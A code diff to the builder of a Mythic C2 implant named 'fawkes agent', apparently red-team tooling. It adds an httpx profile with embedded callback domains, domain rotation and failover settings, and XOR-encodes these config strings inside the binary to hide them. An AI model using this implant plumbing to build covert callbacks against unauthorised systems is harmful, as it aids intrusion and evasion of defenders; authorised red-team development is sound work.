@@ -66,7 +66,7 @@ var payloadDefinition = agentstructs.PayloadType{
 	CanBeWrappedByTheFollowingPayloadTypes: []string{},
 	SupportsDynamicLoading:                 false,
 	Description:                            "fawkes agent",
-	SupportedC2Profiles:                    []string{"http", "tcp", "discord"},
+	SupportedC2Profiles:                    []string{"http", "tcp", "discord", "httpx"},
 	MythicEncryptsData:                     true,
 	MessageFormat:                          agentstructs.MessageFormatJSON,
 	BuildParameters: []agentstructs.BuildParameter{
@@ -442,6 +442,29 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
 				ldflags += fmt.Sprintf(" -X '%s.discordPollDelay=%s'", fawkes_main_package, val)
 			}
+		} else if key == "raw_c2_config" {
+			// httpx C2 profile: agent config JSON file (transforms, URIs, headers, message placement)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetFileArg(key); err == nil && val != "" {
+				// Base64-encode the JSON config for embedding as a linker variable
+				encoded := base64.StdEncoding.EncodeToString([]byte(val))
+				ldflags += fmt.Sprintf(" -X '%s.httpxConfig=%s'", fawkes_main_package, encoded)
+			}
+		} else if key == "callback_domains" {
+			// httpx C2 profile: array of callback domains
+			if val, err := payloadBuildMsg.C2Profiles[0].GetArrayArg(key); err == nil && len(val) > 0 {
+				joined := strings.Join(val, ",")
+				ldflags += fmt.Sprintf(" -X '%s.httpxDomains=%s'", fawkes_main_package, joined)
+			}
+		} else if key == "domain_rotation" {
+			// httpx C2 profile: rotation strategy (fail-over, round-robin, random)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.httpxRotation=%s'", fawkes_main_package, val)
+			}
+		} else if key == "failover_threshold" {
+			// httpx C2 profile: number of failures before switching domains
+			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+				ldflags += fmt.Sprintf(" -X '%s.httpxFailoverThreshold=%d'", fawkes_main_package, int(val))
+			}
 		}
 	}
 
@@ -604,6 +627,10 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
 					obfVars = append(obfVars, obfVar{"discordChannelID", val})
 				}
+			case "callback_domains":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetArrayArg(key); err == nil && len(val) > 0 {
+					obfVars = append(obfVars, obfVar{"httpxDomains", strings.Join(val, ",")})
+				}
 			}
 		}
 		// Also encode payloadUUID, hostHeader, proxyURL, customHeaders
@@ -632,6 +659,13 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			plainPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, customHeadersB64)
 			encodedVal := xorEncodeString(customHeadersB64, xorKey)
 			encodedPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, encodedVal)
+			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
+		}
+		// httpxConfig is already base64 — re-encode the base64 string itself
+		if httpxCfgB64 := extractLdflagValue(ldflags, fawkes_main_package, "httpxConfig"); httpxCfgB64 != "" {
+			plainPattern := fmt.Sprintf("-X '%s.httpxConfig=%s'", fawkes_main_package, httpxCfgB64)
+			encodedVal := xorEncodeString(httpxCfgB64, xorKey)
+			encodedPattern := fmt.Sprintf("-X '%s.httpxConfig=%s'", fawkes_main_package, encodedVal)
 			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
 		}
 	}
